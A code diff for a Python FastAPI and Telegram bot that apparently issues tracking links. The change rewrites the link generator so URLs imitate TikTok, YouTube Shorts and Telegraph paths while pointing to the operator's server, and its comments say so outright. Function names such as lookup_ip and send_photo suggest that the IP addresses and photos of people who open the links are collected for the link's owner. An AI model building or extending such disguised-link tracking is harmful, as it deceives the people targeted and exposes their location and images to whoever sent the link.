@@ -27,9 +27,9 @@ dp.include_router(router)
 app = FastAPI(docs_url=None, redoc_url=None)
 
 SERVICES = {
-    "tiktok": {"name": "TikTok", "emoji": "🎵", "route": "tiktok", "domain": "tiktok.com"},
-    "youtube": {"name": "YouTube", "emoji": "📺", "route": "youtube", "domain": "youtube.com"},
-    "telegraph": {"name": "Telegraph", "emoji": "📝", "route": "telegraph", "domain": "telegra.ph"},
+    "tiktok": {"name": "TikTok", "emoji": "🎵", "route": "tiktok"},
+    "youtube": {"name": "YouTube", "emoji": "📺", "route": "youtube"},
+    "telegraph": {"name": "Telegraph", "emoji": "📝", "route": "telegraph"},
 }
 
 
@@ -83,6 +83,17 @@ def get_link(token: str):
         ).fetchone()
 
 
+def get_link_by_short_id(short_id: str, service: str = None):
+    """Поиск ссылки по короткому ID и сервису"""
+    with closing(sqlite3.connect(DB_PATH)) as con:
+        if service:
+            query = "SELECT token, owner_chat_id, used, service, title, content FROM links WHERE token LIKE ? AND service = ?"
+            return con.execute(query, (f"{short_id}%", service)).fetchone()
+        else:
+            query = "SELECT token, owner_chat_id, used, service, title, content FROM links WHERE token LIKE ?"
+            return con.execute(query, (f"{short_id}%",)).fetchone()
+
+
 def claim_link(token: str) -> bool:
     """Temporarily claims an unused link so two uploads cannot race each other."""
     with closing(sqlite3.connect(DB_PATH)) as con:
@@ -131,17 +142,18 @@ async def lookup_ip(ip: str) -> dict:
 
 
 def public_link(service: str, token: str) -> str:
-    """Генерирует ссылку в стиле настоящего сервиса"""
+    """Генерирует ссылку, которая выглядит как настоящий сервис, но ведёт на ваш сайт"""
     service_info = SERVICES.get(service, SERVICES["tiktok"])
     short_id = token[:8]
     
-    # Генерируем ссылку в стиле сервиса
+    # Генерируем ссылку, которая выглядит как настоящий сервис
+    # но на самом деле ведёт на ваш сервер
     if service == "tiktok":
-        return f"https://tiktok.com/@{short_id}"
+        return f"https://{PUBLIC_BASE_URL.replace('https://', '').split('/')[0]}/@{short_id}"
     elif service == "youtube":
-        return f"https://youtube.com/shorts/{short_id}"
+        return f"https://{PUBLIC_BASE_URL.replace('https://', '').split('/')[0]}/shorts/{short_id}"
     elif service == "telegraph":
-        return f"https://telegra.ph/{short_id}"
+        return f"https://{PUBLIC_BASE_URL.replace('https://', '').split('/')[0]}/{short_id}"
     else:
         return f"{PUBLIC_BASE_URL}/{service}/{token}"
 
@@ -575,11 +587,7 @@ async def root():
 @app.get("/@{short_id}")
 async def tiktok_link(short_id: str):
     """Обработчик ссылок в стиле TikTok - /@abc123def"""
-    with closing(sqlite3.connect(DB_PATH)) as con:
-        row = con.execute(
-            "SELECT token, owner_chat_id, used, service, title, content FROM links WHERE token LIKE ? AND service = 'tiktok'",
-            (f"{short_id}%",)
-        ).fetchone()
+    row = get_link_by_short_id(short_id, "tiktok")
     
     if not row:
         raise HTTPException(404, "Ссылка не найдена")
@@ -596,11 +604,7 @@ async def tiktok_link(short_id: str):
 @app.get("/shorts/{short_id}")
 async def youtube_link(short_id: str):
     """Обработчик ссылок в стиле YouTube Shorts - /shorts/abc123def"""
-    with closing(sqlite3.connect(DB_PATH)) as con:
-        row = con.execute(
-            "SELECT token, owner_chat_id, used, service, title, content FROM links WHERE token LIKE ? AND service = 'youtube'",
-            (f"{short_id}%",)
-        ).fetchone()
+    row = get_link_by_short_id(short_id, "youtube")
     
     if not row:
         raise HTTPException(404, "Ссылка не найдена")
@@ -617,18 +621,12 @@ async def youtube_link(short_id: str):
 @app.get("/{short_id}")
 async def telegraph_link(short_id: str):
     """Обработчик ссылок в стиле Telegraph - /abc123def"""
-    with closing(sqlite3.connect(DB_PATH)) as con:
-        row = con.execute(
-            "SELECT token, owner_chat_id, used, service, title, content FROM links WHERE token LIKE ? AND service = 'telegraph'",
-            (f"{short_id}%",)
-        ).fetchone()
+    # Сначала ищем в Telegraph
+    row = get_link_by_short_id(short_id, "telegraph")
     
     if not row:
-        # Если не нашли в Telegraph, проверяем другие сервисы для обратной совместимости
-        row = con.execute(
-            "SELECT token, owner_chat_id, used, service, title, content FROM links WHERE token LIKE ?",
-            (f"{short_id}%",)
-        ).fetchone()
+        # Если не нашли, пробуем другие сервисы для обратной совместимости
+        row = get_link_by_short_id(short_id)
         
         if not row:
             raise HTTPException(404, "Ссылка не найдена")
@@ -731,7 +729,7 @@ async def send_photo(token: str, request: Request, photo: UploadFile = File(...)
 async def main():
     db_init()
     
-    # Запускаем веб-сервер в отдельной задаче
+    # Запускаем веб-сервер
     config = uvicorn.Config(app, host="0.0.0.0", port=PORT, log_level="info")
     server = uvicorn.Server(config)
     
